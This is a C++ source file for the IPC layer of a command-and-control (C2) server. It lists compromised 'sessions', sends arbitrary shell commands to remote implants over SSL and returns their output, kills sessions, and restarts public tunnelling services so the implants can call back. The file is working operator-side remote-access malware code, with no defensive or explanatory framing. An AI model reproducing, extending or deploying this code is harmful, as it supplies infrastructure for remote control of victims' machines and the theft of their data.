#include "../include/ipc_manager.h"
#include "../include/common_state.h"
#include "../include/ui_manager.h"
#include "../include/tunnel_manager.h"
#include "../../common/protocol.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <mutex>
#include <thread>
#include <chrono>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#endif

// Global mutex to protect std::cout from concurrent writes
std::mutex g_cout_mutex;

void HandleIPCConnection(int new_socket) {
    std::string request;
    char buffer[4096];
    int valread;

    // Use a loop to read the full request until shutdown(SD_SEND) or connection close
    while ((valread = recv(new_socket, buffer, sizeof(buffer), 0)) > 0) {
        request.append(buffer, valread);
    }

    if (!request.empty()) {
        std::string response = "ERR";

        if (request == "LIST") {
            std::lock_guard<std::mutex> lock(session_mutex);
            std::ostringstream oss;
            for (auto const& [id, s] : active_sessions) {
                oss << id << "|" << s.ip << "|" << s.status << "|" << s.last_seen << "\n";
            }
            response = oss.str();
            if (response.empty()) response = "EMPTY";
        }
        else if (request == "STATUS") {
            response = global_public_url + "|" + std::to_string(SERVER_PORT) + "|" + (global_gist_success ? "OK" : "FAIL");
        }
        else if (request == "T_STATUS") {
            response = global_public_url + "|" + (IsProcessRunning(LOCALTONET_EXE) ? "Running" : "Stopped");
        }
        else if (request == "T_FULL_LOG") {
            response = GetDetailedTunnelLogs();
        }
        else if (request.substr(0, 9) == "T_RESTART") {
            CleanupSystem();
            TunnelType type = TunnelType::LOCALTONET;
            if (request.length() > 10) {
                int typeIdx = std::stoi(request.substr(10));
                if (typeIdx == 2) type = TunnelType::PINGGY;
                else if (typeIdx == 3) type = TunnelType::SERVEO;
                else if (typeIdx == 4) type = TunnelType::LOCALHOST_RUN;
            }
            std::string dummy;
            StartTunnelAndGetUrl(SERVER_PORT, dummy, type);
            if (global_public_url != "None") {
                response = "SUCCESS|" + global_public_url;
            } else {
                response = "FAILED";
            }
        }
        else if (request.substr(0, 5) == "KILL ") {
            int id = std::stoi(request.substr(5));
            std::lock_guard<std::mutex> lock(session_mutex);
            if (active_sessions.count(id)) {
                bool sent = SendSecureMessage(active_sessions[id].ssl, ":kill");
                std::string output;
                if (sent) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(500));
                    ReceiveSecureMessage(active_sessions[id].ssl, output);
                }
                SSL_free(active_sessions[id].ssl);
                active_sessions.erase(id);
                response = sent ? ("KILLED|" + (output.empty() ? "Success." : output)) : "KILLED|Fail.";
            } else {
                response = "ERR_ID";
            }
        }
        else if (request.substr(0, 5) == "EXEC ") {
            size_t space = request.find(' ', 5);
            if (space != std::string::npos) {
                int id = std::stoi(request.substr(5, space - 5));
                std::string cmd = request.substr(space + 1);
                std::lock_guard<std::mutex> lock(session_mutex);
                if (active_sessions.count(id)) {
                    if (SendSecureMessage(active_sessions[id].ssl, cmd)) {
                        std::string output, cwd;
                        if (ReceiveSecureMessage(active_sessions[id].ssl, output) && ReceiveSecureMessage(active_sessions[id].ssl, cwd)) {
                            response = output + "|||" + cwd;
                            if (cwd == "TERMINATED") {
                                SSL_free(active_sessions[id].ssl);
                                active_sessions.erase(id);
                            }
                        } else {
                            SSL_free(active_sessions[id].ssl);
                            active_sessions.erase(id);
                            response = "ERR_RECV";
                        }
                    } else {
                        SSL_free(active_sessions[id].ssl);
                        active_sessions.erase(id);
                        response = "ERR_SEND";
                    }
                } else {
                    response = "ERR_ID";
                }
            }
        }
        else if (request == "SHUTDOWN") {
            c2_running = false;
            response = "OK";
        }
        
        send(new_socket, response.c_str(), response.length(), 0);
    }
    closesocket(new_socket);
}

void IPCServerThread() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(INTERNAL_IPC_PORT);

    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) return;
    listen(server_fd, 5);

    while (c2_running) {
        new_socket = accept(server_fd, (sockaddr*)&address, (int*)&addrlen);
        if (new_socket < 0) continue;

        // Concurrent handling of IPC requests
        std::thread worker(HandleIPCConnection, new_socket);
        worker.detach();
    }
    closesocket(server_fd);
}

std::string SendIPCRequest(const std::string& request) {
    int sock = 0;
    struct sockaddr_in serv_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) return "ERR_SOCK";

    // --- TIMEOUT CONFIGURATION ---
#ifdef _WIN32
    DWORD timeout = 3000; 
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
#else
    struct timeval tv;
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
#endif

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(INTERNAL_IPC_PORT);
    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);

    // --- NON-BLOCKING CONNECT (INSTANT STARTUP) ---
#ifdef _WIN32
    u_long mode = 1;
    ioctlsocket(sock, FIONBIO, &mode);
#else
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
#endif

    int res_conn = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
    
    if (res_conn < 0) {
#ifdef _WIN32
        if (WSAGetLastError() != WSAEWOULDBLOCK) {
            closesocket(sock);
            return "ERR_CONN";
        }
#else
        if (errno != EINPROGRESS) {
            closesocket(sock);
            return "ERR_CONN";
        }
#endif
        // Wait for connection with a strict 1-second timeout
        fd_set set;
        FD_ZERO(&set);
        FD_SET(sock, &set);
        struct timeval tv_conn = { 1, 0 }; // 1 second
        if (select(sock + 1, NULL, &set, NULL, &tv_conn) <= 0) {
            closesocket(sock);
            return "ERR_CONN";
        }
    }

    // Set back to blocking mode for simple transmission
#ifdef _WIN32
    mode = 0;
    ioctlsocket(sock, FIONBIO, &mode);
#else
    fcntl(sock, F_SETFL, flags);
#endif

    send(sock, request.c_str(), request.length(), 0);
    shutdown(sock, SD_SEND);

    std::string res;
    char buffer[4096];
    int valread;
    
    while ((valread = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
        res.append(buffer, valread);
    }
    
    closesocket(sock);
    return res.empty() ? "ERR_READ" : res;
}
